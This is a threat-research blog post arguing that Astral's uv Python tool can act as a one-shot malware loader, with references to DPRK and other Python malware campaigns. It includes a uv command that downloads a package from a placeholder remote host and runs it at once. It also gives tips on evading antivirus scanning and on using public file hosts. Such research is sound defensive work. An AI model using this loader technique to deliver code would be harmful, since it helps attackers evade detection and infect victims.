<!doctype html><html lang=en-us><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-C2KWQMHPS9"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-C2KWQMHPS9")</script><meta property="og:url" content="http://blog.fa.nta.sy/posts/2026-01-19-astral-uv-python-malware-loader/"><meta property="og:site_name" content="Investigations by 0xFantasy"><meta property="og:title" content="Next-Gen Python Malware: Leveraging Astral's UV as a One-Shot Loader"><meta property="og:description" content="Python- and JavaScript-based malware has become increasingly popular within the last few years. Specifically, the DPRK’s Contagious Interview campaign has leveraged both languages using a variety delivery methods."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-01-19T19:31:20-05:00"><meta property="article:modified_time" content="2026-01-19T19:31:20-05:00"><meta property="article:tag" content="Default"><meta property="article:tag" content="Malware"><meta property="article:tag" content="Python"><meta name=twitter:card content="summary"><meta name=twitter:title content="Next-Gen Python Malware: Leveraging Astral's UV as a One-Shot Loader"><meta name=twitter:description content="Python- and JavaScript-based malware has become increasingly popular within the last few years. Specifically, the DPRK’s Contagious Interview campaign has leveraged both languages using a variety delivery methods."><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><style type=text/css>body{font-family:monospace}</style><title>Next-Gen Python Malware: Leveraging Astral's UV as a One-Shot Loader</title><link rel=stylesheet href=/css/style.css></head><body><header>=================================<br>== <a href=http://blog.fa.nta.sy/>Investigations by 0xFantasy</a> ==<br>=================================<div style=float:right></div><br><p><nav><a href=/><b>Start</b></a>.</header><main><article><h1>Next-Gen Python Malware: Leveraging Astral's UV as a One-Shot Loader</h1><b><time>2026-01-19 19:31:20</time></b>
<a href=/tags/default>default</a>
<a href=/tags/malware>malware</a>
<a href=/tags/python>python</a><div><h2 id=rise-of-interpreted-language-malware>Rise of Interpreted Language Malware</h2><p>Python- and JavaScript-based malware has become increasingly popular within the last few years.
Specifically, the DPRK&rsquo;s <a href=https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/>Contagious Interview</a> campaign has leveraged both languages (<a href=https://attack.mitre.org/software/S1246/>BeaverTail</a> and <a href=https://attack.mitre.org/software/S1245/>InvisibleFerret</a>) using a variety delivery methods.
Most recently, VSCode <a href=https://opensourcemalware.com/blog/contagious-interview-vscode><code>tasks.json</code> files</a> have been leveraged since the end of 2025 as a one-click infection vector.</p><p>Other APT groups have also been seen leveraging Python-based malware, including <a href=https://malpedia.caad.fkie.fraunhofer.de/actor/void_blizzard>Void Blizzard</a>, aka UAC-0190.
In early 2026, PLUGGYAPE, a modular Python loader communicating over MQTT, was reported by <a href=https://cert.gov.ua/article/6286942>CERT-UA</a>.</p><p>Shortly after this, the <a href=https://malwaresourcecode.com/home/my-projects/write-ups/smokest-stealer-a-new-malware-family-maybe>Smokest Stealer</a> malware family was <a href=https://x.com/Kostastsale/status/2012352752098373722>identified</a> which specifically leveraged <a href=https://docs.deno.com/runtime/>Deno</a>, a JavaScript runtime similar to Node.js.
However, Deno is an unusual choice of runtime: it is much newer than Node.js and has a <a href=https://survey.stackoverflow.co/2024/technology#most-popular-technologies-webframe>significantly smaller user base</a>.</p><p>This led me to start thinking about other new runtimes that have been gaining popularity.</p><h2 id=astral-uv>Astral: UV</h2><p><a href=https://astral.sh/>Astral Software</a> is a relatively new company focused on building Python developer tooling, including <code>ruff</code>, <code>uv</code>, and <code>ty</code>.
UV, specifically, is a cross-platform, all-in-one version manager, project manager, and script runner.
It states that it aims to replace &ldquo;pip, pip-tools, pipx, poetry, pyenv, twine, virtualenv, and more.&rdquo;</p><h2 id=surely-this-cant-be-a-malware-loader>Surely This Can&rsquo;t Be a Malware Loader</h2><p>With the aim of replacing all the previously mentioned tools, a surprising amount of functionality can be packed into a single <code>uv</code> command.
Including, but not limited to, isolated Python installations, ephemeral dependency management, and running in-line scripts.</p><p>This functionality removes a lot of restrictions Python malware developers previously faced.
Common limitations included being restricted to only native libraries (e.g., urllib) and either having to package a Python runtime within another stager or attempt to LOLBin an existing Python runtime.</p><p>Another hurdle with Python malware is that developers typically either have to expose their entire script as a CLI arg or write it to disk before executing.
This gives ample opportunity for AV engines to inspect what is being run.
UV allows <a href=https://docs.astral.sh/uv/guides/scripts/#running-a-script-with-dependencies>dependencies to be specified via CLI flag</a> while executing a script, dynamically fetching and installing the required packages at runtime.
Because UV is pip-compatible, this means that packages can also be installed using the <a href="https://pip.pypa.io/en/latest/cli/pip_install/#examples:~:text=Install%20a%20particular%20source%20archive%20file%20following%20direct%20references%20(specification)"><code>package @ URI</code> syntax</a> either as a <code>.whl</code> or <code>.tar.gz</code> distribution from any remote host.</p><p>This has two benefits: it significantly minimizes the amount of Python code that must be included as a CLI arg (it can end up being as simple as <code>import package; package.main()</code>), and it allows payload delivery in a format that is unusual for AV scanners.
While the package contents are eventually written to disk temporarily, this can complicate initial static analysis.</p><p>Take the following <code>uv</code> command as an example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>uv run --no-project --no-cache --python 3.13 <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--with <span style=color:#e6db74>&#34;library @ https://remote-host.com/package.tar.gz&#34;</span> <span style=color:#ae81ff>\ </span>
</span></span><span style=display:flex><span>python -c <span style=color:#e6db74>&#34;import library; library.func()&#34;</span>
</span></span></code></pre></div><ul><li><code>uv run</code> = Run a script</li><li><code>--no-project --no-cache</code> = Do not use local files; install packages fresh; then delete everything</li><li><code>--python 3.13</code> = Install and use UV&rsquo;s managed version of Python 3.13</li><li><code>--with "library @ https://remote-host.com/package.tar.gz"</code> = Include &ldquo;library&rdquo; as a dependency and install it from a remote URL</li><li><code>python -c "import library; library.func()"</code> = Run the Python interpreter, import the library, and immediately invoke a function</li></ul><p>One caveat between <code>.whl</code> and <code>.tar.gz</code> file formats is that while both have strict naming conventions (<a href=https://packaging.python.org/en/latest/specifications/binary-distribution-format/#file-name-convention>.whl</a>; <a href=https://packaging.python.org/en/latest/specifications/source-distribution-format/#source-distribution-file-name>.tar.gz</a>), enforcement only applies to <code>.whl</code> files. This allows <code>.tar.gz</code> files to be arbitrarily named, which has the added benefit of enabling the use of public file-hosting services that manipulate filenames (e.g., Catbox, Uguu, Pomf file hosting, etc.).</p><p>Using the following <a href=https://github.com/vile/imwhlfile>example package</a> and including the EICAR string as a comment in <code>main.py</code>, the resulting distribution files received, at most, 2 detections on VirusTotal (<a href=https://www.virustotal.com/gui/file/d429ad6457f329146cdedcb05b4b14d0f184b82a365d61c785e662026f434aa4/detection>.whl scan</a>; <a href=https://www.virustotal.com/gui/file/fa001746b745273a375da3ab69ec0e5d075c70798910e505a9123b46acf19a17/detection>.tar.gz scan</a>).</p></div></article></main><aside><div><div><h3>LATEST POSTS</h3></div><div><ul><li><a href=/posts/2026-01-19-astral-uv-python-malware-loader/>Next-Gen Python Malware: Leveraging Astral's UV as a One-Shot Loader</a></li><li><a href=/posts/2026-01-01-telegraph-malware-scams-leaked-gov-docs/>Telegra.ph: Malware, Scams, and Leaked Government Docs (Kinda)</a></li><li><a href=/posts/2025-08-01-weaponizing-unity-packages/>Weaponizing Unity Packages for Malware Delivery</a></li><li><a href=/posts/2024-10-20-how-to-actually-secure-your-x-account/>How to Actually Secure Your X Account</a></li><li><a href=/posts/2024-10-06-exch-cx-investigation/>Investigating Hackers', Exploiters' Favorite Instant Crypto Exchange</a></li></ul></div></div></aside><footer><p>&copy; 2026 <a href=http://blog.fa.nta.sy/><b>Investigations by 0xFantasy</b></a>.
<a href=https://x.com/0xFantasy target=_blank>X.com</a>.
<a href=https://github.com/Vile target=_blank>Github</a>.
<a href=https://bsky.app/profile/fanta.sy target=_blank>Bluesky</a>.</p></footer></body></html>